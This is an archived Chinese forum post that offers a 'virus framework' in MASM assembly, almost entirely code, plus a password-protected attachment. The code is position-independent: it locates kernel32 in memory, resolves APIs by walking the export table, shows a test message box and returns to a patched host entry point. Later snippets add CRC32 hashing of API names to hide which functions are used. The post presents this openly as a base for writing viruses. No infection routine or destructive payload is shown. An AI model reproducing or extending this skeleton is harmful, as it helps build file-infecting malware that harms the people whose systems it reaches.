

# 病毒框架----charme.w32

> 原文：[`www.pediy.com/kssd/pediy10/103004.html`](https://www.pediy.com/kssd/pediy10/103004.html)

很多朋友说我写的那些病毒编译链接的时候对于 mov dword ptr \[ebp+aa\],eax 这样的语句提示内存访问错误，还有的说 masm 写病毒的话，很多时候把  
aa proc    
....  
....  
aa enp  
改成  
aa:  
....  
....  
ret  
会出错什么的  
其实这些都是功底不行，甚至上面那个只是个 link 选项设置的问题。  
  
很多人看这些病毒的时候看着晕。越看越糊涂，实际上没有那么难。  
asm 的魅力系列做完了，我给大家最后写个病毒的框架。病毒这玩意儿，就像玩命大哥说的：玩玩就可以了，asm 能玩出花样来。  
  
我代码直接贴上，里面的精妙之处大家仔细看就能理解了。  
我没有做过多的注释，我觉得也没有必要。  
  

代码:

```
;;author:charme
;;date:2009.12.12
;;index:http://hi.baidu.com/charme000
;;ml /nologo /coff /c charme.asm
;;link /subsystem:windows /section:.text,RW charme.obj


.586
.model flat,stdcall
option casemap:none

.code
start:
pushad
pushfd

call aa
aa:
pop ebp
sub ebp,offset aa

mov eax,DWORD ptr \[ebp+offset \_ret\]
mov DWORD ptr \[ebp+offset  \_where\],eax

mov esi,DWORD ptr \[esp + 24h\]
call get\_kernel\_image\_base
    
call find\_main\_apis
  
call find\_extra\_apis


mov eax,offset szCharme
add eax,ebp
push 0
push eax
push eax
push 0
call \[ebp+AMessageBoxA\]

jmp \_exit
szCharme db 'success',0

\_where dd 0



find\_extra\_apis:
jmp load\_ 

user32 db "user32.dll",0
SMessageBoxA  db "MessageBoxA",0
AMessageBoxA  dd 0

load\_:
mov eax,offset user32
add eax,ebp
push eax
call \[ebp + offset AGetModuleHandleA\]
cmp eax,0h
jne load\_message\_box 

mov eax,offset user32
add eax,ebp
push eax
call \[ebp + offset ALoadLibraryA\]
cmp eax,0
je \_exit
  
  
load\_message\_box:
mov ebx,offset SMessageBoxA
add ebx,ebp
push ebx
push eax ; user32.dll
call \[ebp + offset AGetProcAddress\]
cmp eax,0h
je \_exit
  
mov dword ptr \[ebp + offset AMessageBoxA\],eax
    
ret
;----------------------------------------------------------------------------------------------------------------------
get\_kernel\_image\_base:  
      
mov ecx,esi 
jmp start\_getting 


k32 dd 0

start\_getting:
cmp dword ptr \[esi\],'NREK' 
je found\_kernel\_str
dec esi
loop start\_getting
mov eax,0
ret

  found\_kernel\_str:
  cmp word ptr \[esi\],'ZM'
   je return\_
   dec esi
  loop found\_kernel\_str  
  mov eax,0
  ret

    return\_:          
    mov dword ptr \[ebp + offset k32\],esi
    cmp esi,0
    je \_exit
    
    ret
;------------

find\_main\_apis:   
 
jmp get\_kernel\_pe\_header 




k32\_export\_table dd 0 ;VA
k32\_name\_table   dd 0 ;VA
k32\_name\_counter dd 0

next\_api\_string     dd 0
current\_api\_string   dd 0
str\_size       dd 0
api\_address\_counter     dd 0
api\_strings:
SExitProcess    db   "ExitProcess",0
SGetProcAddress   db   "GetProcAddress",0
SGetModuleHandleA  db   "GetModuleHandleA",0
SLoadLibraryA    db   "LoadLibraryA",0



dd 00000090h 

api\_addresses:
AExitProcess     dd 0  
AGetProcAddress    dd 0
AGetModuleHandleA  dd 0
ALoadLibraryA    dd 0


get\_kernel\_pe\_header:
mov esi,dword ptr \[ebp + offset k32\]
add esi,dword ptr \[esi + 3Ch\] ; PE header VA
  
mov esi,dword ptr \[esi + 78h\] ; export table RVA
add esi,dword ptr \[ebp + offset k32\] ;VA
mov dword ptr \[ebp + offset k32\_export\_table\],esi
  
add esi,32d ; address of names RVA in export table
mov esi,dword ptr \[esi\]
add esi, dword ptr \[ebp + offset k32\] ; starting of dword array of function names in k32
mov dword ptr \[ebp + offset k32\_name\_table\],esi
  
  ;start next\_api\_string
mov dword ptr \[ebp + offset next\_api\_string\],offset api\_strings
add dword ptr \[ebp + offset next\_api\_string\],ebp
  
  
api\_loop:
mov esi,dword ptr \[ebp + offset next\_api\_string\]
cmp dword ptr \[esi\],00000090h
je all\_found
  ;get a string from api\_strings label
mov dword ptr \[ebp + offset k32\_name\_counter\],0h ;reset name counter
mov esi,dword ptr \[ebp + offset next\_api\_string\]
xor ecx,ecx
mov dword ptr \[ebp + offset current\_api\_string\],esi
@@: cmp byte ptr \[esi\],0h
je @F
inc ecx
inc esi
jmp @B
@@:  
mov dword ptr \[ebp + offset str\_size\],ecx
inc esi
mov dword ptr \[ebp + offset next\_api\_string\],esi ; next str
    
get\_name\_from\_k32:
;get a name and normalize it
mov eax,dword ptr \[ebp + offset k32\_name\_counter\]
mov ebx,4h
mul ebx
add eax,dword ptr \[ebp + offset k32\_name\_table\]
mov eax,dword ptr \[eax\]
add eax,dword ptr \[ebp + offset k32\] ; now we have an api name
add dword ptr \[ebp + offset k32\_name\_counter\],1h ;  increment for next
  
compare\_two\_names:
mov ecx,dword ptr \[ebp + offset str\_size\]
mov edi,eax ; api name in k32 name table
mov esi,dword ptr \[ebp + offset current\_api\_string\]
@@:cmpsb
jne @F
loop @B
;we have found it so calculate ordinal
jmp calc\_ordinal
@@: ;not the same api
jmp get\_name\_from\_k32
    
calc\_ordinal:
sub dword ptr \[ebp + offset k32\_name\_counter\],1h ; current names ordinal pos
mov ebx,2
mov eax,dword ptr \[ebp + offset k32\_name\_counter\]
mul ebx
    
mov esi,dword ptr \[ebp + offset k32\_export\_table\]
add esi,36d
mov esi,dword ptr \[esi\]
add esi,dword ptr \[ebp + offset k32\] ; ordinal table
add esi,eax ; ordinal of our api
    
movzx eax,word ptr \[esi\] ; ordinal of our api
    
mov esi,dword ptr \[ebp + offset k32\_export\_table\]
add esi,28d
mov esi,dword ptr \[esi\]
add esi,dword ptr \[ebp + offset k32\] ; address table
    
mov ebx,4h
mul ebx
add esi,eax
mov esi,dword ptr \[esi\]
add esi,dword ptr \[ebp + offset k32\]
        
    
mov eax,dword ptr \[ebp + offset api\_address\_counter\]    
mov dword ptr \[ebp + offset api\_addresses + eax\],esi
add dword ptr \[ebp + offset api\_address\_counter\],4h
      
      
jmp api\_loop
      
all\_found:
mov dword ptr \[ebp + offset api\_address\_counter\],0 
  
ret
  
  
\_exit:
mov eax,DWORD ptr \[ebp+offset  \_where\]
mov DWORD ptr \[ebp+offset  \_ret +3h\],eax
cmp ebp,0
jne \_ret
push 0
call \[ebp+offset AExitProcess\]

\_ret:
popfd
popad
db 68h,0,0,0,0
ret

end start

```

总结：实际上这个地方玩命只是强调框架，病不涉及什么病毒深层的技术，你有新的思路，可以自己加。  
  
研究了老 V 的感染驱动的病毒框架，其实这个做些修改就可以的。只是内部的东西我们需要单独的研究下。  
  
把代码发附件吧！  
  
经玩命大哥提示，其实那个 api 列表在框架里面我们完全可以同 crc 处理。加个过程就可以了。  
代码:

```
;----------------------------------------------------------------------------;
;int \_\_fastcall crc32(char\*);
@crc32          proc
                push    esi
                xchg    eax,esi
                mov     edx,mCRC32\_init
        gCRC32\_next\_byte:
                lodsb
                or      al,al           ;end of name ?
                jz      gCRC32\_finish

                xor     dl,al
                mov     al,08h
        gCRC32\_next\_bit:
                shr     edx,01h
                jnc     gCRC32\_no\_change
                xor     edx,mCRC32
        gCRC32\_no\_change:
                dec al
                jnz     gCRC32\_next\_bit
                jmp     gCRC32\_next\_byte
        gCRC32\_finish:
                xchg    eax,edx         ;CRC32 to EAX
                pop     esi
                ret

@crc32          endp

```

或者写个宏：  
代码:

```
mCRC32        equ     0C1A7F39Ah             
mCRC32\_init   equ     09C3B248Eh              

crc32m  macro   string
            crcReg = mCRC32\_init
      irpc    \_x,<string>
    ctrlByte = '&\_x&' xor (crcReg and 0FFh)
    crcReg = crcReg shr 8
    rept 8
                    ctrlByte = (ctrlByte shr 1) xor (mCRC32 \* (ctrlByte and 1))
    endm
    crcReg = crcReg xor ctrlByte
      endm
        dd  crcReg
endm

```

上传的附件
| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || charme.w32.rar  
注意：解压密码是 PEDIY  
 |